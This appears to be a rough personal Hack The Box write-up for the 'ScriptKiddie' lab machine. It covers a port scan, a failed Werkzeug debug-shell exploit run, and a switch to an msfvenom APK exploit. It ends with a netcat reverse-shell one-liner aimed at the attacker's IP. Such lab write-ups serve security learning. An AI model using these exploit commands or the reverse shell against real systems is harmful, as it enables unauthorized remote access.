# how to push to git

cd existing\_folder
git init
git remote add origin https://gitlab.com/Injamam\_Ahmed/htb-writeups.git
git add .
git commit -m "Initial commit"
git push -u origin main


# listing ports

## we have the following ports

  22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
  
  5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
  
## 22 ssh is not vulnerable but 5000 might be but first lets visit the website

![[Pasted image 20210614012440.png]]

![[Pasted image 20210614012745.png]]

![[Pasted image 20210614012627.png]]

here is the website

### we can see something interesting here in port 5000 it says service is "upnp" whereas in our scan it says "http Werkzeug"

### we have to make this clear what is it but both of the things have vulnerability in them

```
   What does enabling UPnP do?

Universal Plug and Play (**UPnP**) is a protocol that allows apps and other devices on your network to open and close ports automatically to connect with each other. ... **UPnP**\-**enabled** devices **can** automatically join a network, obtain an IP address, and find and connect to other devices on your network, making it very convenient.01-Aug-2019
```

```
   Werkzeug - 'Debug Shell' Command Execution                                       |multiple/remote/43905.py        
  Werkzeug - Debug Shell Command Execution (Metasploit)                             python/remote/37814.rb 
```

### so we know the upnp is open and the werkzug hag debugshell commane execution so lets try to exploit it

## we tried to run the exploit from searchsploit but it didnt worked

```
┌──(root💀kali)-[/home/kali/HTB/scriptkiddie]
└─# searchsploit -m 43905.py
  Exploit: Werkzeug - 'Debug Shell' Command Execution
      URL: https://www.exploit-db.com/exploits/43905
     Path: /usr/share/exploitdb/exploits/multiple/remote/43905.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/HTB/scriptkiddie/43905.py
  
┌──(root💀kali)-[/home/kali/HTB/scriptkiddie]
└─# chmod +x 43905.py  
         
┌──(root💀kali)-[/home/kali/HTB/scriptkiddie]
└─# python2 43905.py                      
USAGE: python 43905.py <ip> <port> <your ip> <netcat port>

┌──(root💀kali)-[/home/kali/HTB/scriptkiddie]
└─# python2 43905.py 10.10.10.226 5000 10.10.14.23 1234                           
[-] Debug is not enabled
                              
┌──(root💀kali)-[/home/kali/HTB/scriptkiddie]
└─# python2 43905.py 10.10.10.226 5000 10.10.14.23 443               

[-] Debug is not enabled

```

### as we know we have upnp in 5000 we have to try to first enable the debug then we can have access

### lets run gobuster and see for any file in there
 ### no luck with gobuster 
 
 ## after hours realized it all was a rabbithole and the vulnerability is in a msfvenom apk file 
 
  ### so lets get the exploit for it and see what we can get
  
  https://www.exploit-db.com/exploits/49491
  
  ### this is the exploit we will change the attack type to get reverse shell
  
  ![[Pasted image 20210614030100.png]]
  
  ### we will change the payload to a reverse shell
  
  ```
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 1234 >/tmp/f
  ```
  
  and then we will execute it to get the exploit
  
  